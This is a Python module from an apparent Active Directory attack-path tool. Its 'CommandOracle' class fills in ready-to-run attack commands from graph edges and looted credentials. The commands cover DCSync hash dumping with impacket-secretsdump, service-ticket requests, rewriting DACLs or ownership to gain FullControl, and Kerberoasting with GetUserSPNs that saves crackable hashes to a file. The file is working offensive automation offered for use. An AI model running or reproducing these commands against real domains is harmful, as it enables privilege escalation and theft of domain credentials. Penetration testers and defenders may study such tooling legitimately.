"""Command generation for exploitation paths."""

from __future__ import annotations

from dataclasses import dataclass

from engine.loot import LootManager


EDGE_TOOL_MAP: dict[str, str] = {
    "DCSync": "impacket-secretsdump",
    "GenericAll": "impacket-getST",
    "WriteDacl": "impacket-dacledit",
    "WriteOwner": "impacket-owneredit",
    "MemberOf": "powerview",
}


@dataclass
class NodeContext:
    """Minimal node context used for dynamic command formatting."""

    id: str
    name: str
    node_type: str
    spn: str = ""
    domain: str = ""


class CommandOracle:
    """Generate ready-to-run commands from edge context and available loot."""

    def __init__(self, loot_manager: LootManager) -> None:
        self.loot_manager = loot_manager

    def _infer_domain(self, source_node: NodeContext, target_node: NodeContext) -> str:
        for candidate in (source_node.domain, target_node.domain):
            if candidate:
                return candidate

        for candidate in (source_node.name, target_node.name):
            if "@" in candidate:
                return candidate.split("@", maxsplit=1)[1].upper()

        for candidate in (source_node.name, target_node.name):
            if "." in candidate:
                return ".".join(candidate.split(".")[1:]).upper()

        return "<DOMAIN>"

    def _infer_username(self, source_node: NodeContext) -> str:
        credential = self.loot_manager.get_credential(source_node.id) or self.loot_manager.get_credential(
            source_node.name,
        )
        if credential and credential.username:
            return credential.username

        if "@" in source_node.name:
            return source_node.name.split("@", maxsplit=1)[0]

        return source_node.name

    def _auth_flags(self, source_node: NodeContext) -> str:
        flags = self.loot_manager.build_auth_flags(source_node.id)
        if flags:
            return flags
        return self.loot_manager.build_auth_flags(source_node.name)

    def get_exploit_command(
        self,
        edge_type: str,
        source_node: dict[str, str],
        target_node: dict[str, str],
    ) -> str:
        """Return a command template populated with loot and node metadata."""
        source = NodeContext(
            id=str(source_node.get("id", "")),
            name=str(source_node.get("name", "SOURCE_USER")),
            node_type=str(source_node.get("type", "entity")),
            spn=str(source_node.get("spn", "")),
            domain=str(source_node.get("domain", "")),
        )
        target = NodeContext(
            id=str(target_node.get("id", "")),
            name=str(target_node.get("name", "TARGET")),
            node_type=str(target_node.get("type", "entity")),
            spn=str(target_node.get("spn", "")),
            domain=str(target_node.get("domain", "")),
        )

        domain = self._infer_domain(source, target)
        username = self._infer_username(source)
        auth_flags = self._auth_flags(source)
        auth_part = f" {auth_flags}" if auth_flags else ""

        normalized_edge = edge_type or "Unknown"

        if normalized_edge == "DCSync":
            target_dc = target.name or "<DC_HOST>"
            return (
                f"impacket-secretsdump{auth_part} {domain}/{username}@{target_dc} "
                "-just-dc"
            )

        if normalized_edge == "GenericAll" and target.node_type == "computer":
            target_spn = target.spn or f"HOST/{target.name}"
            return f"impacket-getST{auth_part} -spn {target_spn} {domain}/{username}"

        if normalized_edge == "WriteDacl":
            target_object = target.name or target.id or "<TARGET_OBJECT>"
            return (
                f"impacket-dacledit{auth_part} -action write -rights FullControl "
                f"-target '{target_object}' {domain}/{username}"
            )

        if normalized_edge == "WriteOwner":
            target_object = target.name or target.id or "<TARGET_OBJECT>"
            return (
                f"impacket-owneredit{auth_part} -action write -target '{target_object}' "
                f"{domain}/{username}"
            )

        if normalized_edge == "MemberOf":
            target_group = target.name or "<TARGET_GROUP>"
            return (
                f"powershell -c \"Get-DomainGroupMember -Identity '{target_group}'\""
            )

        tool = EDGE_TOOL_MAP.get(normalized_edge, "manual")
        return (
            f"# No direct automation for edge '{normalized_edge}'. Suggested tool: {tool}\n"
            f"# Source: {source.name} -> Target: {target.name}"
        )

    def get_kerberoast_command(self, target_node: dict[str, str]) -> str:
        """Return an impacket-GetUserSPNs command for a kerberoastable target node."""
        target = NodeContext(
            id=str(target_node.get("id", "")),
            name=str(target_node.get("name", "TARGET_USER")),
            node_type=str(target_node.get("type", "user")),
            spn=str(target_node.get("spn", "")),
            domain=str(target_node.get("domain", "")),
        )
        domain = self._infer_domain(target, target)

        # Use any available credential from loot as the attacker context.
        attacker_user = "<attacker_user>"
        auth_part = ""
        all_creds = self.loot_manager.all_credentials()
        if all_creds:
            first_cred = all_creds[0]
            attacker_principal = first_cred.get("principal", "")
            flags = self.loot_manager.build_auth_flags(attacker_principal)
            if flags:
                auth_part = f" {flags}"
                raw_user = (
                    first_cred.get("username", "")
                    or attacker_principal.split("\\")[-1]
                )
                attacker_user = raw_user or attacker_user

        target_sam = target.name.split("@")[0] if "@" in target.name else target.name
        return (
            f"impacket-GetUserSPNs{auth_part} {domain}/{attacker_user} "
            f"-request-user {target_sam} -outputfile kerberoast.hashes"
        )
